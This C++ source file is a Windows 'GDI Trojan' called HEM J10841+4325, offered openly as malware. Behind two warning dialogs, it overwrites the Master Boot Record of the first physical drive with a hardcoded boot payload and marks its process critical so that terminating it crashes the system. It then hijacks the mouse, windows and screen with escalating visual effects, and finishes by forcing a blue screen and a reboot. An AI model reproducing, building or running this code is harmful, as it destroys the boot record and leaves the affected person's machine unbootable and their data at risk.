// HEM J10841+4325.cpp : Este arquivo contém as funções "principais". É aqui que começa e termina a execução do programa.
// 

#include <windows.h>
#include <cmath>
#include <time.h>
#pragma comment(lib, "winmm.lib")
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
const unsigned char MasterBootRecord[] = {0x68, 0x00, 0xA0, 0x07, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xED, 0x31, 0xD2, 0x31, 0xFF, 0xDB, 
0xE3, 0xE8, 0x2B, 0x00, 0xEB, 0x47, 0x81, 0xFD, 0x40, 0x01, 0x73, 0x0A, 0x81, 0xFA, 0xC8, 0x00, 
0x73, 0x09, 0xAA, 0x45, 0xEB, 0x37, 0x31, 0xED, 0x42, 0xEB, 0x32, 0x31, 0xED, 0x31, 0xD2, 0x31, 
0xFF, 0xD9, 0x06, 0xD4, 0x7C, 0xD8, 0x06, 0xCC, 0x7C, 0xD9, 0x1E, 0xCC, 0x7C, 0xEB, 0x1E, 0x60, 
0x31, 0xDB, 0xBA, 0xC8, 0x03, 0x88, 0xD8, 0xEE, 0xBA, 0xC9, 0x03, 0x88, 0xD8, 0xEE, 0x88, 0xD8, 
0xEE, 0x88, 0xD8, 0xEE, 0x43, 0x81, 0xFB, 0xFF, 0x00, 0x72, 0xE7, 0x61, 0xC3, 0x89, 0x2E, 0xB8, 
0x7C, 0x89, 0x16, 0xBC, 0x7C, 0xDF, 0x2E, 0xCC, 0x7C, 0xD9, 0xFE, 0xD8, 0x0E, 0xBC, 0x7C, 0xD9, 
0x1E, 0xC4, 0x7C, 0xDF, 0x2E, 0xCC, 0x7C, 0xD9, 0xFF, 0xD8, 0x0E, 0xB8, 0x7C, 0xD8, 0x26, 0xC4, 
0x7C, 0xD9, 0x1E, 0xC0, 0x7C, 0xDF, 0x2E, 0xCC, 0x7C, 0xD9, 0xFF, 0xD8, 0x0E, 0xBC, 0x7C, 0xD9, 
0x1E, 0xC8, 0x7C, 0xDF, 0x2E, 0xCC, 0x7C, 0xD9, 0xFE, 0xD8, 0x0E, 0xB8, 0x7C, 0xD8, 0x06, 0xC8, 
0x7C, 0xD9, 0x1E, 0xC2, 0x7C, 0x8B, 0x1E, 0xC0, 0x7C, 0x33, 0x1E, 0xC2, 0x7C, 0x81, 0xE3, 0x10, 
0x27, 0x88, 0xD8, 0x04, 0x32, 0xE9, 0x5E, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x59, 0x40, 0x7B, 0x14, 0xAE, 0x47, 0xE1, 0x7A, 0x84, 0x3F, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI WinMove(LPVOID lpstart) { //credits to Maxi2022gt, his github: https://github.com/Maxi2022gt
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (true) {
        HWND wnd = GetForegroundWindow();
        MoveWindow(wnd, rand() % w, rand() % h, rand() % w, rand() % h, false);
        Sleep(rand() % 100);
    }
}
LPCWSTR generateRandomUnicodeString(int len) {
	wchar_t* ustr = new wchar_t[len + 1];  // +1 for '\0'
	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}
DWORD WINAPI TextProc(LPVOID lpParam) {
	while (true) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)generateRandomUnicodeString(rand() % 26 + 26), SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}
DWORD WINAPI Click(LPVOID lpstart) {
	INPUT input;
	input.type = INPUT_MOUSE;

	while (true) {
		input.mi.dwFlags = (rand() % 2) ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTUP;

		SendInput(1, &input, sizeof(INPUT));
		RtlZeroMemory(&input, sizeof(input));

		Sleep(rand() % 70 + 50);
	}
}
DWORD WINAPI vista(LPVOID lpParam)
{
    HDC hdc = GetDC(0);

    int y = GetSystemMetrics(0);
    int x = GetSystemMetrics(0);

    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(0);

    for (int i = 2; i < 333; i++) {
        BitBlt(hdc, rand() % i + i, rand() % i, sw, x, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, rand() % i, rand() % i + i, sh, y, hdc, 0, 0, SRCCOPY);

    }
}
DWORD WINAPI whirls(LPVOID lpParam)
{
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh/10, ySize = 9;
    while (1) {
    	HDC desk = GetDC(0);
        for (int i = 0; i < sh*2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(desk, i, 0, 1, sh, desk, i, wave, SRCCOPY);
        }
        for (int i = 0; i < sw*2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(desk, 0, i, sw, 1, desk, wave, i, SRCCOPY);
        }
    }
}
DWORD WINAPI trich(LPVOID lpParam)
{
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			//INT x = i % w, y = i / w;
			rgbScreen[i].rgb -= 666;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI rgb(LPVOID lpParam)
{
    HWND v3; 
    HBITMAP h; 
    HDC hdcSrc; 
    HDC hdc; 
    void* lpvBits;
    int nHeight; 
    int nWidth; 
    DWORD v12; 
    int j; 
    int v14; 
    int i; 
    v12 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 2)
    {
        hdc = GetDC(0);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - v12 > 0xA)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 110))
                v14 = rand() % 24;
            *((BYTE*)lpvBits + 4 * j + v14) -= 5;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}
DWORD WINAPI textout(LPVOID lpParam)
{
    int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
    LPCSTR text = 0;
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    while(1)
    {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        text = "HEM J10841+4325",
        text1 = "What? Help me!";
        text2 = "Tubercomiosis + Vistamations";
        text3 = "ENJOY THE BEEPING, BAAAAAAAAA";
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        DeleteObject(font);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI icons(LPVOID lpParam)
{
    while (1)
    {
        HDC hdc = GetDC(0);
        int x = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y = rand() % GetSystemMetrics(SM_CYSCREEN);
        HMODULE hModule = LoadLibrary(TEXT("user32.dll"));
        int randomIcon = rand() % (250 - 50 + 1) + 50;
        HICON hIcon = LoadIcon(hModule, MAKEINTRESOURCE(randomIcon));
        ICONINFO iconInfo;
        GetIconInfo(hIcon, &iconInfo);
        BITMAP bmpIcon;
        GetObject(iconInfo.hbmColor, sizeof(BITMAP), &bmpIcon);
        int iconWidth = bmpIcon.bmWidth;
        int iconHeight = bmpIcon.bmHeight;
        DrawIconEx(hdc, x, y, hIcon, iconWidth * 9, iconHeight * 9, 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(1);
        FreeLibrary(hModule);
    }
} 
DWORD WINAPI darkener(LPVOID lpParam)
{
    HDC hdc;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI sierpinski(LPVOID lpParam)
{
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
	BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
		int x = i % w, y = i / h, t = y ^ y | x;
		data[i].rgb = x & y & t;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 
DWORD WINAPI squr(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
	while(1){
		HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
		int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y; 
    	HBRUSH brush = CreateSolidBrush(RGB(0, 0, 255));
    	SelectObject(hdc, brush);
		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
                signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }
        if (y == 0)
        {
            signY = 1;
        }
        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
    	DeleteObject(brush);
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI beziers(LPVOID lpParam)
{
	int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    while(1){
    	HDC hdc = GetDC(0);
		POINT p[4]  = {rand() % sw, rand() % sh, rand() % sw, rand() % sh,  rand() % sw, rand() % sh};
        HPEN hPen = CreatePen(PS_SOLID,5,RGB(0,0,255));
        SelectObject(hdc, hPen);
		PolyBezier(hdc, p, 4);
    	DeleteObject(hPen);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI train(LPVOID lpParam)
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
    	HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);
    	DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(rand() % 100);
    }
}
DWORD WINAPI spin(LPVOID lpParam)
{
    HDC hWindow;
    HDC hDsktp;
    HWND hWnd;
    RECT wRect;
    int dX = 0;
    int dY = 0;
    int dW;
    int dH;
    POINT lppoint[3];
    int counter = 30;
    while (true)
    {
        hWnd = GetDesktopWindow();
        hWindow = GetWindowDC(hWnd);
        hDsktp = GetDC(0);
        GetWindowRect(hWnd, &wRect);
        dW = GetSystemMetrics(0);
        dH = GetSystemMetrics(0);
        lppoint[0].x = wRect.left + counter;
        lppoint[0].y = wRect.top - counter;
        lppoint[1].x = wRect.right + counter;
        lppoint[1].y = wRect.top + counter;
        lppoint[2].x = wRect.left - counter;
        lppoint[2].y = wRect.bottom - counter;
        PlgBlt(hDsktp, lppoint, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
        if (counter < 15) counter++;
        if (counter < 65) counter--;
        ReleaseDC(0,  hDsktp);
    }
} 
DWORD WINAPI masg(LPVOID lpParam)
{
	while (1) {
		MessageBoxW(NULL, L"What a horrible decision you've made!", L"SAY BYE TO PC", MB_OKCANCEL | MB_ICONERROR);
	}
	return 0;
}
DWORD WINAPI beepbeep(LPVOID lpParam)
{
	while (1) {
		Beep(rand () % 2555, rand () % 25);
	}
}
 
int main() {
	if (MessageBoxW(NULL, L"You are currently about to run the HEM J10841+4325.exe GDI Trojan made by Tubercomiosis99 and Vistamations. Continue?", L"What? Help me! Help = No", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will erase your data, so be wary!", L"Huh???", MB_OKCANCEL | MB_ICONEXCLAMATION) == IDCANCEL)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			CreateThread(0, 0, TextProc, 0, 0, 0);
			CreateThread(0, 0, Click, 0, 0, 0);
			CreateThread(0, 0, WinMove, 0, 0, 0);
			Sleep(7000);
			HANDLE z = CreateThread(0, 0, masg, 0, 0, 0);
			Sleep(1000);
			HANDLE a = CreateThread(0, 0, vista, 0, 0, 0);
			Sleep(15000);
			TerminateThread(a, 0);
			CloseHandle(a);
		        InvalidateRect(0, 0, 0);
			HANDLE b = CreateThread(0, 0, whirls, 0, 0, 0);
			HANDLE c = CreateThread(0, 0, trich, 0, 0, 0);
			Sleep(15000);
			TerminateThread(b, 0);
			TerminateThread(c, 0);
			CloseHandle(b);
		        InvalidateRect(0, 0, 0);
			CloseHandle(c);
		        InvalidateRect(0, 0, 0);
			HANDLE d = CreateThread(0, 0, rgb, 0, 0, 0);
			HANDLE e = CreateThread(0, 0, textout, 0, 0, 0);
			Sleep(15000);
			TerminateThread(d, 0);
			TerminateThread(e, 0);
			CloseHandle(d);
		        InvalidateRect(0, 0, 0);
			CloseHandle(e);
		        InvalidateRect(0, 0, 0);
			HANDLE f = CreateThread(0, 0, icons, 0, 0, 0);
			HANDLE g = CreateThread(0, 0, darkener, 0, 0, 0);
			Sleep(15000);
			TerminateThread(f, 0);
			TerminateThread(g, 0);
			CloseHandle(f);
		        InvalidateRect(0, 0, 0);
			CloseHandle(g);
		        InvalidateRect(0, 0, 0);
			HANDLE h = CreateThread(0, 0, sierpinski, 0, 0, 0);
			Sleep(15000);
			TerminateThread(h, 0);
			CloseHandle(h);
		        InvalidateRect(0, 0, 0);
			HANDLE i = CreateThread(0, 0, squr, 0, 0, 0);
			HANDLE j = CreateThread(0, 0, icons, 0, 0, 0);
			Sleep(15000);
			TerminateThread(i, 0);
			TerminateThread(j, 0);
			CloseHandle(i);
		        InvalidateRect(0, 0, 0);
			CloseHandle(j);
		        InvalidateRect(0, 0, 0);
			HANDLE k = CreateThread(0, 0, beziers, 0, 0, 0);
			HANDLE l = CreateThread(0, 0, whirls, 0, 0, 0);
			Sleep(15000);
			TerminateThread(k, 0);
			TerminateThread(l, 0);
			CloseHandle(k);
		        InvalidateRect(0, 0, 0);
			CloseHandle(l);
		        InvalidateRect(0, 0, 0);
			HANDLE m = CreateThread(0, 0, train, 0, 0, 0);
			HANDLE n = CreateThread(0, 0, icons, 0, 0, 0);
			Sleep(15000);
			TerminateThread(m, 0);
			TerminateThread(n, 0);
			CloseHandle(m);
		        InvalidateRect(0, 0, 0);
			CloseHandle(m);
		        InvalidateRect(0, 0, 0);
			HANDLE o = CreateThread(0, 0, spin, 0, 0, 0);
			HANDLE p = CreateThread(0, 0, textout, 0, 0, 0);
			Sleep(15000);
			TerminateThread(o, 0);
			TerminateThread(p, 0);
			TerminateThread(z, 0);
			CloseHandle(o);
		        InvalidateRect(0, 0, 0);
			CloseHandle(p);
		        InvalidateRect(0, 0, 0);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC000012F, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;

			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			return 0;
		}
	}
}
